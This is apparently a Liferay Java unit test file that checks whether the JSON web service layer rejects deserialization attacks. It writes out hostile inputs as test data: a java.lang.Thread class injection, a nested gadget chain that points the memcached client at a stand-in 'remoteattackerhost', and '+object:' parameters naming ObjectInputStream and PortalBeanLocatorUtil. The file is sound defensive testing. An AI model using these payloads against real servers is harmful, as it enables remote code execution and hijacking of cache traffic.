/**
 * Copyright (c) 2000-present Liferay, Inc. All rights reserved.
 *
 * This library is free software; you can redistribute it and/or modify it under
 * the terms of the GNU Lesser General Public License as published by the Free
 * Software Foundation; either version 2.1 of the License, or (at your option)
 * any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more
 * details.
 */

package com.liferay.portal.jsonwebservice;

import com.liferay.petra.string.StringBundler;
import com.liferay.portal.jsonwebservice.action.JSONWebServiceInvokerAction;
import com.liferay.portal.kernel.jsonwebservice.JSONWebServiceAction;
import com.liferay.portal.kernel.module.util.SystemBundleUtil;
import com.liferay.portal.kernel.util.MapUtil;
import com.liferay.portal.kernel.util.PropsKeys;
import com.liferay.portal.test.rule.LiferayUnitTestRule;

import jodd.typeconverter.TypeConversionException;

import junit.framework.TestCase;

import org.junit.BeforeClass;
import org.junit.ClassRule;
import org.junit.Rule;
import org.junit.Test;

import org.osgi.framework.BundleContext;
import org.osgi.framework.ServiceRegistration;

import org.springframework.mock.web.MockHttpServletRequest;

/**
 * @author Igor Spasic
 */
public class JSONWebServiceSecureTest extends BaseJSONWebServiceTestCase {

	@ClassRule
	@Rule
	public static final LiferayUnitTestRule liferayUnitTestRule =
		LiferayUnitTestRule.INSTANCE;

	@BeforeClass
	public static void setUpClass() throws Exception {
		initPortalServices();

		registerActionClass(OpenService.class);
	}

	@Test
	public void testAttack1() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/open/run1/foo-ids/[1,2,{\"class\":\"java.lang.Thread\"}]");

		JSONWebServiceAction jsonWebServiceAction = lookupJSONWebServiceAction(
			mockHttpServletRequest);

		try {
			jsonWebServiceAction.invoke();

			TestCase.fail();
		}
		catch (Exception exception) {
		}
	}

	@Test
	public void testAttack2() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/open/run2");

		mockHttpServletRequest.setParameter(
			"bytes",
			StringBundler.concat(
				"{\"class\":",
				"\"com.liferay.portal.kernel.dao.orm.EntityCacheUtil\",",
				"\"entityCache\":{\"class\":",
				"\"com.liferay.portal.dao.orm.common.EntityCacheImpl\",",
				"\"multiVMPool\":{\"class\":",
				"\"com.liferay.portal.cache.MultiVMPoolImpl\",",
				"\"portalCacheManager\":{\"class\":",
				"\"com.liferay.portal.cache.memcached.",
				"MemcachePortalCacheManager\",\"timeout\":60,\"",
				"timeoutTimeUnit\":\"SECONDS\",",
				"\"memcachedClientPool\":{\"class\":",
				"\"com.liferay.portal.cache.memcached.",
				"DefaultMemcachedClientFactory\",",
				"\"connectionFactory\":{\"class\":",
				"\"net.spy.memcached.BinaryConnectionFactory\"},",
				"\"addresses\":[\"remoteattackerhost:11211\"]}}}}}"));

		JSONWebServiceAction jsonWebServiceAction = lookupJSONWebServiceAction(
			mockHttpServletRequest);

		try {
			jsonWebServiceAction.invoke();

			TestCase.fail();
		}
		catch (Exception exception) {
		}
	}

	@Test(expected = TypeConversionException.class)
	public void testAttack3NotOnWhitelistCall() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/invoke");

		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
		mockHttpServletRequest.setParameter(
			"+object:java.io.ObjectInputStream", "{}");

		JSONWebServiceAction jsonWebServiceAction =
			new JSONWebServiceInvokerAction(mockHttpServletRequest);

		jsonWebServiceAction.invoke();
	}

	@Test(expected = IllegalArgumentException.class)
	public void testAttack3UtilCall() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/invoke");

		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
		mockHttpServletRequest.setParameter(
			"+object:com.liferay.portal.kernel.bean.PortalBeanLocatorUtil",
			"{\"beanLocator\":null}");

		JSONWebServiceAction jsonWebServiceAction =
			new JSONWebServiceInvokerAction(mockHttpServletRequest);

		jsonWebServiceAction.invoke();
	}

	@Test
	public void testAttack3ValidCall() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/invoke");

		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
		mockHttpServletRequest.setParameter("+object:java.lang.Object", "{}");

		JSONWebServiceAction jsonWebServiceAction =
			new JSONWebServiceInvokerAction(mockHttpServletRequest);

		jsonWebServiceAction.invoke();
	}

	@Test
	public void testAttack3WhitelistedByOSGiCall() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/invoke");

		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
		mockHttpServletRequest.setParameter("+object:java.util.Random", "{}");

		JSONWebServiceAction jsonWebServiceAction =
			new JSONWebServiceInvokerAction(mockHttpServletRequest);

		try {
			jsonWebServiceAction.invoke();

			TestCase.fail();
		}
		catch (Exception exception) {
		}

		BundleContext bundleContext = SystemBundleUtil.getBundleContext();

		ServiceRegistration<Object> serviceRegistration =
			bundleContext.registerService(
				Object.class, new Object(),
				MapUtil.singletonDictionary(
					PropsKeys.
						JSONWS_WEB_SERVICE_PARAMETER_TYPE_WHITELIST_CLASS_NAMES,
					new String[] {"java.util.Random", "some.other.Class"}));

		try {
			jsonWebServiceAction.invoke();
		}
		finally {
			serviceRegistration.unregister();
		}
	}

	@Test
	public void testAttack3WhitelistedByPropertiesCall() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/invoke");

		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
		mockHttpServletRequest.setParameter("+object:java.util.Date", "0");

		JSONWebServiceAction jsonWebServiceAction =
			new JSONWebServiceInvokerAction(mockHttpServletRequest);

		jsonWebServiceAction.invoke();
	}

}